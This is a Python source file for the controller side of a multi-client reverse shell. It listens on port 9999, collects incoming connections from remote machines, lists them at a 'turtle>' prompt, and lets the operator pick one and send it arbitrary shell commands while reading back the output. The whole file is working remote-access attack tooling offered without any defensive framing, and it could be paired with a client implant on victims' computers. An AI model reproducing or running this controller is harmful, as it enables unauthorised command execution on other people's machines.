import socket
import sys
import time
import threading
from queue import Queue

NUMBER_OF_THREADS=2
JOB_NUMBER=[1,2]
queue=Queue()
all_connections=[]
all_address = []


# create a socket
def create_socket():
    try:
        global host, port, s 
        host = ''
        port = 9999
        s=socket.socket()
    except socket.error as msg:
        print('Socket creation error'+str(msg))

#Binding the socket end listening for connection
        
def bind_socket():
    try:
        global host, port, s
        print("Binding the host"+str(port))
        s.bind((host, port))
        s.listen(5) # 5 is the number bad connections or number of times it is going to try

    except socket.error as msg:
        print("Socket binding error"+str(msg))
        bind_socket()


#Handling connections from multiple clients and saving them to the lists.
# closing previous connections when server.py is restarted

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]
    while True: #infinite while loop where it waits for a connection
        try:
            conn, address = s.accept()
            s.setblocking(1) # this prevents the timeout from happening (like if we don't do anything for so long, it doesn't close)
            all_connections.append(conn)
            all_address.append(address)
            print('connection has been established:'+ address[0])
        except s.error as msg:
            print('Error in accepting the connections'+ str(msg))


#2nd Thread functios 1)  see all the clients 2) Select a client 3) Send commands to the connected client
# interactive prompt for sending commands
#turtle> list
# 1- Friend -A
# 2- Friend -B
# 3- Friend -C
def start_turtle():
    while True:
        cmd = input("turtle> ")
        if cmd == 'list':
            list_connections() # lists all the connecitons
        elif 'select' in cmd: #like 'select 1'
            conn=get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print('command not recognized')

def list_connections():
    results = ''
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results+=str(i)+ ' select '+str(all_address[i][0])+ ' '+ str(all_address[i][1])+'\n'
    print(results)

def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None


def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd))>0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),"utf-8")
                print(client_response, end="")
        except:
            print("error sending commands")
            break

def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x==2:
            start_turtle()
        queue.task_done()

create_workers()
create_jobs()
    
# Establish connection with a Client (socket must be listening)
# def socket_accept():
#     conn,address = s.accept()
#     print('output',address[0], address[1])
#     send_command(conn)
#     conn.close()
# # send commands to the client
# def send_command(conn):
#     while True:
#         cmd = input()
#         if cmd == 'quit':
#             conn.close()
#             s.close()
#             sys.exit()
#         if len(str.encode(cmd))>0:
#             conn.send(str.encode(cmd))
#             client_response = str(conn.recv(1024),"utf-8")
#             print(client_response, end="")

# def main():
#     create_socket()
#     bind_socket()
#     socket_accept()
# main()
